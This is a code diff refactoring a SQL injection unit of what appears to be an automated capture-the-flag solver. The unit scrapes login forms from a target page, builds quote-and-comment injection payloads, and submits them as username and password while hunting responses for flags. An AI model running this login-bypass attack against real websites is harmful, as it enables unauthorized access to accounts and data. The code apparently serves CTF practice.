@@ -11,24 +11,24 @@ import re
 import units.web
 import requests
 import magic
+import units
 
 class Unit(units.web.WebUnit):
 
-	def __init__(self, config):
-		super(Unit, self).__init__(config)
-	
-	def check(self, target):
-		return super(Unit, self).check(target[0])
+	def __init__(self, katana, parent, target):
 
-	def get_cases(self, target):
+		# Run the parent constructor, to ensure this is a valid URL
+		super(Unit, self).__init__(katana, parent, target)
+		if not katana.config['flag_format']:
+			raise units.NotApplicable
+
+
+	def enumerate(self, katana):
 		
 		# This should "yield 'name', (params,to,pass,to,evaluate)"
 		# evaluate will see this second argument as only one variable and you will need to parse them out
-		
-		if not self.config['flag_format']:
-			log.warning('No flag format specified, basic_sqli will not be effective.')
 
-		r = requests.get(target)
+		r = requests.get(self.target)
 
 		action = re.findall(r"<\s*form.*action\s*=\s*('|\")(.+?)('|\")", r.text, flags=re.IGNORECASE)
 		method = re.findall(r"<\s*form.*method\s*=\s*('|\")(.+?)('|\")", r.text, flags=re.IGNORECASE)
@@ -72,20 +72,19 @@ class Unit(units.web.WebUnit):
 
 							payload = quote + delimeter + test.replace(' ' ,delimeter) + delimeter + '1' + delimeter + comment
 							count_attempt += 1
-							yield 'basic_sqli%d' % count_attempt, (target, method, action, username, password, payload)
+							yield (method, action, username, password, payload)
 
 		else:
-			log.failure("[web.basic_sqli] Could not find potential HTTP variables! Aborting!")
 			return # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.
 
 
-	def evaluate(self, target):
+	def evaluate(self, katana, case):
 		# Split up the target (see get_cases)
-		target, method, action, username, password, payload = target
+		method, action, username, password, payload = case
 
-		r = method(target + action, { username: payload, password : payload })
+		r = method(self.target + action, { username: payload, password : payload })
 		# Hunt for flags. If we found one, stop all other requests!
-		hit = self.find_flags(r.text)
+		hit = katana.locate_flags(self, r.text)
 
 		if hit:
 			self.completed = True
